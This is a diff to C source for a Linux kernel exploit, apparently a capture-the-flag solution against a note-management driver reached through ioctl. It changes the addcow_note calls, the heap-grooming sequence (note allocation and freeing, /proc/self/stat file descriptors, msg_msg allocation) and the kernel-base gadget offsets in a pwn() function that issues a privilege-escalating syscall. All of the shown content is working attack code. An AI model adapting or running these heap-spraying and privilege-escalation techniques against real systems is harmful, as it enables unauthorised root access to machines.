@@ -147,14 +147,13 @@ int64_t addnote(uint64_t idx, uint64_t size, uint perm)
     return ioctl(devfd, ADDNODE_CMD, &req);
 }
 
-int64_t addcow_note(uint64_t idx, uint64_t idx_cpy, uint perm, size_t size)
+int64_t addcow_note(uint64_t idx, uint64_t idx_cpy, uint perm)
 {
     struct Req req = {0};
     req.idx = idx;
     req.idx_cpy = idx_cpy;
     req.cmd = 0x13380002;
     req.perm_rw = perm;
-    req.size = size;
     return ioctl(devfd, ADDNODE_CMD, &req);
 }
 
@@ -239,7 +238,7 @@ void pwn(int stat_fd)
         "xor eax, eax; "
         "syscall;"
         :
-        : "r"(kbase + 0x1042ad), "r"(kbase + 0x6a81ff), "r"(kbase + 0x319d55), "r"(kbase + 0x80017c));
+        : "r"(kbase + 0x1042ad), "r"(kbase + 0x6a81ff), "r"(0x133700000), "r"(kbase + 0x80017c));
 }
 
 int main(int argc, char **argv, char **envp)
@@ -255,7 +254,7 @@ int main(int argc, char **argv, char **envp)
 
     delnote(0);
 
-    addcow_note(0, 0xe, READ_PERM, 0x10);
+    addcow_note(0, 0xe, READ_PERM);
     addnote(1, 0x20, 1);
     delnote(1);
 
@@ -281,11 +280,11 @@ int main(int argc, char **argv, char **envp)
         close(stat_fds[i]);
     }
 
-    addcow_note(1, 0, WRITE_PERM, 0x10);
+    addcow_note(1, 0, WRITE_PERM);
     delnote(1);
-    addcow_note(1, 0xe, WRITE_PERM, 0x10);
+    addcow_note(1, 0xe, WRITE_PERM);
     int stat = open("/proc/self/stat", O_RDONLY);
-    addcow_note(3, 10, WRITE_PERM, 0x20);
+    addcow_note(3, 10, WRITE_PERM);
     delnote(1);
 
     allocate_msgmsg20(&msg, 1);
